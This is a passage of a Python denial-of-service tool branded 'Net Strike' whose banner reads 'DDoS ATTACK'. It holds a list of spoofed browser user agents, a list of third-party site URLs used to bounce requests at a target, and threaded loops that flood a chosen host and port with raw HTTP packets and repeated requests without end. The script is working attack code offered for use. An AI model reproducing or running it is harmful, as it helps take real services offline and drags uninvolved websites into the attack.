                "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240")
            uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko")
            uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17")
            uagent.append(
                "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4")
            uagent.append(
                "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)")
            uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)")
            uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko")
            uagent.append("Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append(
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4")
            uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko")
            uagent.append(
                "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53")
            uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16")
            uagent.append("Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append(
                "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4")
            uagent.append(
                "Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0")
            uagent.append(
                "Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53")
            uagent.append(
                "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10")
            uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2")
            uagent.append(
                "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4")
            uagent.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4")
            uagent.append(
                "Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko")
            uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36")
            uagent.append("Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.0; Touch; rv:11.0) like Gecko")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko")
            uagent.append("Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append(
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
            uagent.append("Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append(
                "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4")
            uagent.append(
                "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")

            return (uagent)


        def my_bots():
            global bots
            bots = []
            bots.append("http://validator.w3.org/check?uri=")
            bots.append("http://www.facebook.com/sharer/sharer.php?u=")
            bots.append("http://engadget.search.aol.com/search?q=")
            bots.append("http://www.usatoday.com/search/results?q=")
            bots.append("http://www.google.com/?q=")
            bots.append("http://www.bing.com/search?q=")
            bots.append("https://www.yandex.com/yandsearch?text=")
            bots.append("https://duckduckgo.com/?q=")
            bots.append("http://www.ask.com/web?q=")
            bots.append("http://search.aol.com/aol/search?q=")
            bots.append("https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term")
            bots.append("https://drive.google.com/viewerng/viewer?url=")
            bots.append("http://validator.w3.org/feed/check.cgi?url=")
            bots.append("http://host-tracker.com/check_page/?furl=")
            bots.append("http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=")
            bots.append("http://jigsaw.w3.org/css-validator/validator?uri=")
            bots.append("https://add.my.yahoo.com/rss?url=")
            bots.append("http://www.google.com/?q=")
            bots.append("http://www.usatoday.com/search/results?q=")
            bots.append("http://engadget.search.aol.com/search?q=")
            bots.append("https://steamcommunity.com/market/search?q=")
            bots.append("http://www.topsiteminecraft.com/site/pinterest.com/search?q='")
            bots.append("http://eu.battle.net/wow/en/search?q=")
            bots.append("https://www.google.ae/search?q=")
            bots.append("https://www.google.com.af/search?q=")
            bots.append("https://www.google.com.ag/search?q=")
            bots.append("https://www.google.com.ai/search?q=")
            bots.append("https://www.google.al/search?q=")
            bots.append("https://www.google.am/search?q=")
            bots.append("https://www.google.co.ao/search?q=")
            bots.append("https://steamcommunity.com/market/search?q=")
            bots.append("https://www.ted.com/search?q=")
            bots.append("https://play.google.com/store/search?q=")
            bots.append("https://www.qwant.com/search?q=")
            bots.append("https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=")
            bots.append("https://www.google.ad/search?q=")
            bots.append("https://www.youtube.com/")
            bots.append("https://check-host.net/")
            bots.append("https://www.bing.com/search?q=")
            bots.append("https://r.search.yahoo.com/")
            bots.append("https://www.facebook.com/")
            bots.append("https://vk.com/profile.php?redirect=")
            bots.append("https://www.usatoday.com/search/results?q=")
            bots.append("https://help.baidu.com/searchResult?keywords=")

            return (bots)


        def bot_hammering(url):
            try:
                while True:
                    req = urllib.request.urlopen(
                        urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
                    print("\033[94mbot is hammering\033[0m")
                    time.sleep(.1)
            except:
                time.sleep(.1)


        def down_it(item):
            try:
                while True:
                    packet = str(
                        "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(
                            uagent) + "\n" + data).encode(
                        'utf-8')
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, int(port)))
                    if s.sendto(packet, (host, int(port))):
                        s.shutdown(1)
                        print("\033[92m", time.ctime(time.time()),
                              "\033[0m \033[94m <--Packet sended by Net Strike ddos--> \033[0m")
                    else:
                        s.shutdown(1)
                        print("\033[91off shod<->down\033[0m")
                    time.sleep(.1)
            except socket.error as e:
                print("\033[91mno connection! server maybe down\033[0m")
                # print("\033[91m",e,"\033[0m")
                time.sleep(.1)


        def dos():
            while True:
                item = q.get()
                down_it(item)
                q.task_done()


        def dos2():
            while True:
                item = w.get()
                bot_hammering(random.choice(bots) + "http://" + host)
                w.task_done()


        def usage():
            print(Fore.RED + '''
        ███╗   ██╗███████╗████████╗ ███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
        ████╗  ██║██╔════╝╚══██╔══╝ ██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
        ██╔██╗ ██║█████╗     ██║    ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  
        ██║╚██╗██║██╔══╝     ██║    ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
        ██║ ╚████║███████╗   ██║    ███████║   ██║   ██║  ██║██║██║  ██╗███████╗
        ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝ 
                      \033[1;34;40m DDoS ATTACK \033[0;0m</> \033[0;49;92mNET STRIKE\033[0;0m 
                        Author -> K I V Y </> ABH
        \033[0;49;95m Example -> python3 NetSTRIK.py -s 127.0.0.1 -p 443 -t 200
        \033[1;34;40m	-s : server ip\033[0;0m
        \033[0;49;33m	-p : port default 80\033[0;0m
        \033[0;49;92m	-t : turbo default 135   \033[92m
        ======================================================================''')
            sys.exit()


        def get_parameters():
            global host
            global port
            global thr
            global item
            optp = OptionParser(add_help_option=False, epilog="Hammers")
            optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel",
                            const=logging.ERROR, default=logging.INFO)
            optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
            optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
            optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 135 -t 135")
            optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
            opts, args = optp.parse_args()
            logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
            if opts.help:
                usage()
            if opts.host is not None:
                host = opts.host
            else:
                usage()
            if opts.port is None:
                port = 80
            else:
                port = opts.port
            if opts.turbo is None:
                thr = 135
            else:
                thr = opts.turbo


        # reading headers
        global data
        headers = open("headers.txt", "r")
        data = headers.read()
        headers.close()
        # task queue are q,w
        q = Queue()
        w = Queue()

        if __name__ == '__main__':
            if len(sys.argv) < 2:
                usage()
            get_parameters()
            print("\033[92m", host, " port: ", str(port), " turbo: ", str(thr), "\033[0m")

            print("\033[94mWait I'm looking for some infected systems\033[0m")
            print("\033[94mPlease wait...\033[0m")
            user_agent()
            my_bots()
            time.sleep(5)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, int(port)))
                s.settimeout(1)
            except socket.error as e:
                print("\033[91mcheck server ip and port\033[0m")
                usage()
            while True:
                for i in range(int(thr)):
                    t = threading.Thread(target=dos)
                    t.daemon = True  # if thread is exist, it dies
                    t.start()
                    t2 = threading.Thread(target=dos2)
                    t2.daemon = True  # if thread is exist, it dies
                    t2.start()
                start = time.time()
                # tasking
                item = 0
                while True:
                    if (item > 1800):  # for no memory crash
                        item = 0
                        time.sleep(.1)
                    item = item + 1
                    q.put(item)
                    w.put(item)
                q.join()
                w.join()

        break  # Exit the loop if credentials are correct
    else:
        print("\033[;49;91m Invalid ID or password. Please try again")
